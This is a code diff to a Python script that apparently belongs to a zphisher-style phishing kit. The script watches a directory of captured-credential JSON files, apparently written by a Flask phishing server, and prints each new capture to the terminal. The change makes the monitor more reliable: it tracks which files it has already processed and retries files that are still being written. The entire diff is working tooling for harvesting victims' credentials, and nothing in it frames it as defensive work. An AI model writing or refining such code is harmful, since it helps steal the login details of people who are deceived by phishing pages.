@@ -3,7 +3,7 @@ import time
 import json
 from utils import CREDENTIALS_DIR
 
-# Ultra-simple color palette
+# Color palette for clean terminal output
 BOLD = '\033[1m'
 GREEN = '\033[92m'
 CYAN = '\033[96m'
@@ -46,34 +46,34 @@ def monitor_credentials(site_name):
     print(f"\n{BOLD}{CYAN}🔍 Monitoring for NEW credentials... (Ctrl+C to stop){RESET}")
     print(f"{YELLOW}Note: Every new capture will be printed instantly below{RESET}")
     
-    # Use Modification Time (mtime) to detect brand new files instantly
-    last_mod_times = {}
+    # Track successfully printed files so we don't repeat them
+    processed_files = set()
 
     try:
         while True:
-            current_files = []
+            current_files = set()
             if os.path.exists(site_dir):
                 for f in os.listdir(site_dir):
                     if f.endswith('.json') and not f.startswith('index') and not f.startswith('tracking'):
-                        filepath = os.path.join(site_dir, f)
-                        mod_time = os.path.getmtime(filepath)
-                        current_files.append((f, mod_time))
+                        current_files.add(f)
             
-            for filename, mod_time in current_files:
-                # If it's a new file OR a file that was just modified
-                if filename not in last_mod_times or mod_time > last_mod_times[filename]:
-                    try:
-                        filepath = os.path.join(site_dir, filename)
-                        with open(filepath, 'r', encoding='utf-8') as f:
-                            entry = json.load(f)
-                        
-                        display_zphisher_style(entry, filename)
-                        
-                        # Mark this modification time as "already printed"
-                        last_mod_times[filename] = mod_time
-                        
-                    except Exception as e:
-                        print(f"{RED}[!] Error reading {filename}: {e}{RESET}")
+            # Find brand new files that haven't been processed yet
+            new_files = current_files - processed_files
+            
+            for filename in new_files:
+                filepath = os.path.join(site_dir, filename)
+                try:
+                    with open(filepath, 'r', encoding='utf-8') as f:
+                        entry = json.load(f)
+                    
+                    # If we made it here, file is fully written. Print it!
+                    display_zphisher_style(entry, filename)
+                    processed_files.add(filename)
+                    
+                except (json.JSONDecodeError, OSError):
+                    # File is still being written by Flask. 
+                    # Don't mark as processed yet. We'll retry it on the next scan.
+                    pass
             
             time.sleep(1)
             
